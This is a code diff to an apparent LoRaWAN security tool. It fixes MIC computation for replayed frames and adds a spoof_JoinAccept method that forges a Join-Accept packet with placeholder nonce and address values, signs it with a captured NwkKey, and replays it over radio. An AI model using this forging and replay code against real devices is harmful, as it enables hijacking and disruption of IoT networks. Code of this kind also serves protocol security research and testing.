@@ -35,19 +35,40 @@ class Player(CommandHandler):
         if self.session_manager.get_session_value(SessionParams.NwkSKey) is None:
             print('Missing NwkSKey in session data')
             return
-        MIC = self.crypto_tool.compute_MIC(self.session_manager.get_session_value(SessionParams.NwkSKey), FRMPayload)
+        MIC = self.crypto_tool.compute_MIC(bytes.fromhex(self.session_manager.get_session_value(SessionParams.NwkSKey)),
+                                           bytes.fromhex(FRMPayload))
 
         payload = '183110' + FRMPayload + MIC  # preamble
 
         self.__replay_message(payload)
 
     def spoof_JoinAccept(self):
-        packet = LoRa()
+        # join accept structure
+        # https://lora-developers.semtech.com/documentation/tech-papers-and-guides/lorawan-device-activation/device-activation/
+        if self.session_manager.get_session_value(SessionParams.NwkKey) is None:
+            print('Missing NwkKey')
+            return
 
-        # join_accept_payload = Join_Accept()
+        PHY = '000000'
+        MHDR = '20'
+        JOIN_APP_NONCE = '111111'
+        NET_ID = '000000'
+        if self.session_manager.get_session_value(SessionParams.JoinAccept_NetID) is not None:
+            NET_ID = self.session_manager.get_session_value(SessionParams.JoinAccept_NetID)
+        DEV_ADDR = '33333333'
+        if self.session_manager.get_session_value(SessionParams.JoinAccept_DevAddr) is not None:
+            DEV_ADDR = self.session_manager.get_session_value(SessionParams.JoinAccept_DevAddr)
+        OTHER = '0000'
+
+        PAYLOAD = MHDR + JOIN_APP_NONCE + NET_ID + DEV_ADDR + OTHER
+
+        PACKET = PHY + PAYLOAD + self.crypto_tool.compute_MIC(bytes.fromhex(self.session_manager.get_session_value(SessionParams.NwkKey)), bytes.fromhex(PAYLOAD))
+
+        self.__replay_message(PACKET)
         # packet.Join_Accept_Field = join_accept_payload
-        # print(join_accept_payload) MEEH
         # Join-accept	MHDR | JoinNonce | NetID | DevAddr | DLSettings | RxDelay | CFList
+
+
 
 
 if __name__ == "__main__":
